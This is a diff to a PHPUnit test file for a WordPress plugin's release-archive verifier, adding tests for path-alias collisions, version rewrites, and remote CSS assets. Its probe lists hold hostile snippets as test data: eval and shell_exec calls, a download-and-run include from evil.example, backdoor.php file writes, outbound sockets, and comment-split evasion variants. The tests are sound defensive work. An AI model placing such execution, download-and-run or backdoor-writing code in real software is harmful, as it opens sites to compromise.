@@ -538,6 +538,27 @@ final class WporgArtifactPolicyTest extends TestCase {
 		}
 	}
 
+	public function test_verifier_rejects_noncanonical_raw_names_and_alias_collisions(): void {
+		foreach ( array( 'mumega-mcp/assets/./index.php', 'mumega-mcp/assets//index.php' ) as $alias ) {
+			$mutation = "index = next(i for i, item in enumerate(entries) if item[0].filename == 'mumega-mcp/assets/index.php')\n"
+				. "info = copy.copy(entries[index][0])\n"
+				. 'info.filename = ' . var_export( $alias, true ) . "\n"
+				. "entries[index] = (info, entries[index][1])\n"
+				. "entries.sort(key=lambda item: item[0].filename.encode('utf-8'))";
+			$result = $this->verify_archive_mutation( $mutation );
+			$this->assertStringContainsString( '[FAIL] canonical manifest path:', $result['output'], $alias );
+		}
+
+		$collision = $this->verify_archive_mutation(
+			"source = next(item for item in entries if item[0].filename == 'mumega-mcp/assets/index.php')\n"
+			. "info = copy.copy(source[0])\n"
+			. "info.filename = 'mumega-mcp/assets/./index.php'\n"
+			. "entries.append((info, source[1]))\n"
+			. "entries.sort(key=lambda item: item[0].filename.encode('utf-8'))"
+		);
+		$this->assertStringContainsString( '[FAIL] canonical manifest path:', $collision['output'] );
+	}
+
 	public function test_verifier_reports_symlink_and_non_regular_entries(): void {
 		foreach ( array( 'symlink ZIP entry' => 'stat.S_IFLNK | 0o777', 'non-regular ZIP entry' => 'stat.S_IFIFO | 0o644' ) as $diagnostic => $mode ) {
 			$mutation = "index = next(i for i, item in enumerate(entries) if item[0].filename == 'mumega-mcp/assets/index.php')\n"
@@ -578,6 +599,14 @@ final class WporgArtifactPolicyTest extends TestCase {
 		$this->assertStringContainsString( '[FAIL] version equality:', $version_file['output'] );
 	}
 
+	public function test_verifier_rejects_coordinated_release_version_rewrite(): void {
+		$mutation = "for target in ['mumega-mcp/mumega-mcp.php', 'mumega-mcp/readme.txt', 'mumega-mcp/VERSION']:\n"
+			. "    index = next(i for i, item in enumerate(entries) if item[0].filename == target)\n"
+			. "    entries[index] = (entries[index][0], entries[index][1].replace(b'3.4.3', b'9.9.9'))";
+		$result = $this->verify_archive_mutation( $mutation, 'mumega-mcp-9.9.9.zip' );
+		$this->assertStringContainsString( '[FAIL] expected release version:', $result['output'] );
+	}
+
 	/** @dataProvider privateArchiveEntries */
 	public function test_verifier_reports_private_and_build_archive_entries( $relative, $diagnostic ): void {
 		$mutation = "info = zipfile.ZipInfo('mumega-mcp/' + " . var_export( $relative, true ) . ")\n"
@@ -609,21 +638,41 @@ final class WporgArtifactPolicyTest extends TestCase {
 	public function dangerousRuntimeProbes(): array {
 		return array(
 			'eval' => array( 'eval( $payload );', 'forbidden execution primitive' ),
+			'comment-split eval' => array( 'eval/* split */( $payload );', 'forbidden execution primitive' ),
 			'assert execution' => array( 'assert( $payload );', 'forbidden execution primitive' ),
 			'shell process' => array( "shell_exec( 'id' );", 'forbidden execution primitive' ),
 			'process pipe' => array( "proc_open( 'id', array(), \$pipes );", 'forbidden execution primitive' ),
 			'dynamic include' => array( 'include $downloaded_file;', 'forbidden execution primitive' ),
+			'comment-split include' => array( 'include/* split */ $downloaded_file;', 'forbidden execution primitive' ),
 			'download and run' => array( "include download_url( 'https://evil.example/payload.php' );", 'forbidden execution primitive' ),
 			'plugin package install' => array( 'new Plugin_Upgrader();', 'forbidden package operation' ),
 			'plugin package update' => array( 'wp_update_plugins();', 'forbidden package operation' ),
 			'plugin delete' => array( 'delete_plugins( array( $plugin ) );', 'forbidden package operation' ),
+			'bulk plugin activation' => array( 'activate_plugins( array( $plugin ) );', 'forbidden package operation' ),
 			'arbitrary code writer' => array( "file_put_contents( ABSPATH . '/backdoor.php', \$payload );", 'forbidden arbitrary code writer' ),
 			'arbitrary CSS writer' => array( "file_put_contents( WP_CONTENT_DIR . '/custom.css', \$payload );", 'forbidden arbitrary code writer' ),
+			'indirect PHP writer' => array( "\$target = ABSPATH . '/backdoor.php';\nfile_put_contents( \$target, \$payload );", 'forbidden arbitrary code writer' ),
+			'indirect CSS writer' => array( "\$target = WP_CONTENT_DIR . '/custom.css';\nfile_put_contents( \$target, \$payload );", 'forbidden arbitrary code writer' ),
 			'arbitrary file handle' => array( "fopen( ABSPATH . '/policy-probe.php', 'w' );", 'forbidden arbitrary code writer' ),
 			'raw curl' => array( "curl_init( 'https://evil.example' );", 'forbidden outbound primitive' ),
 			'raw socket' => array( "fsockopen( 'evil.example', 443 );", 'forbidden outbound primitive' ),
+			'comment-split socket' => array( "fsockopen/* split */( 'evil.example', 443 );", 'forbidden outbound primitive' ),
 			'WordPress HTTP' => array( "wp_remote_get( 'https://evil.example' );", 'forbidden outbound primitive' ),
 			'comment-concatenated host' => array( "\$asset = 'https://evil.' /* join */ . 'example/payload.js';", 'fixed external host' ),
+		);
+	}
+
+	/** @dataProvider remoteCssProbes */
+	public function test_verifier_rejects_remote_css_assets( $probe ): void {
+		$result = $this->verify_mutated_zip( array( 'admin/css/mcpwp-admin.css' => $probe ) );
+		$this->assertStringContainsString( '[FAIL] remote runtime asset:', $result['output'], $probe );
+	}
+
+	public function remoteCssProbes(): array {
+		return array(
+			'remote import' => array( "@import url('https://evil.example/theme.css');\n" ),
+			'unquoted remote URL' => array( "body { background: url(https://evil.example/pixel.png); }\n" ),
+			'protocol-relative userinfo URL' => array( "body { background: url('//mumega.com@evil.example/pixel.png'); }\n" ),
 		);
 	}
 
@@ -749,10 +798,10 @@ final class WporgArtifactPolicyTest extends TestCase {
 	}
 
 	/** @return array{status:int,output:string} */
-	private function verify_archive_mutation( $mutation ): array {
+	private function verify_archive_mutation( $mutation, $filename = 'mumega-mcp-3.4.3.zip' ): array {
 		$temp = sys_get_temp_dir() . '/mcpwp-archive-' . bin2hex( random_bytes( 6 ) );
 		mkdir( $temp, 0700, true );
-		$zip = $temp . '/mumega-mcp-3.4.3.zip';
+		$zip = $temp . '/' . $filename;
 		$script = $temp . '/mutate.py';
 		$python = <<<'PY'
 import copy
